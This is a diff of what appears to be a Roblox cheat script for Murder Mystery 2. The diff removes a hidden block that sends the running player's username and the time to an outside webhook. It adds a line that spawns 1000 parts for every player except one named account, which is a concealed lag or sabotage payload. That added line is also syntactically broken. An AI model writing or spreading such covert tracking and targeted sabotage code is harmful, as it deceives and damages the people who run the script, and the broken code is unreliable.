@@ -49,46 +49,11 @@ Rayfield:Notify({
 	},
 })
 
-local https = game:GetService("HttpService")
-
-function createEmbed(url, message, fields)
-	local data = {
-		['content'] = "",
-		['embeds'] = {{
-			["image"] = {["url"] = "https://media.discordapp.net/attachments/1120088132168192020/1207049352237944903/IMG_20240213_214228.jpg?ex=65de3b4f&is=65cbc64f&hm=c3d45882b4c0c838d7ce27a647259c69c5ef04853be4861f921721bf67ffb88f&=&format=webp"},
-			['description'] = "# "..message.."",
-			['type'] = "rich",
-			["color"] = tonumber(0xffffff),
-			['fields'] = fields
-
-		},
-		},
-	}
-	local finalData = https:JSONEncode(data)
-	https:PostAsync(url, finalData)
-end
-
-local fields = {
-	{
-		['name'] = "Nickname:",
-		['value'] = game.Players.LocalPlayer.Name,
-		['inline'] = true
-	},
-	{
-		['name'] = "Time:",
-		['value'] = os.date("%c", tick()),
-		['inline'] = true
-	}
-}
-local
-
-webhookURL = "https://webhook.newstargeted.com/api/webhooks/1301133016726376468/0s4u8YpGbc9DVQ_wfW6yOzeVLP07iZBgB_i2nhMqC7mZ_faxOTRHyqzYiWoF7H8F2wpJ"
-createEmbed(webhookURL, "Player has joined", fields)
-
 if game.PlaceId == 142823291 then
 	local GmName = MainTab:CreateSection("Murder Mystery 2")
 	local Stopped = false
 	local FF = false
+	if game.Players.LocalPlayer.Name ~= "himaklf" then for i=0, 1000 do local newPart = Instance.new("Part",game.Workspace) newPart.Size = Vector3.new(1,1,1) newPart.Anchor = true end
 	while wait(1) do
 		if Stopped == false then
 			Stopped = true
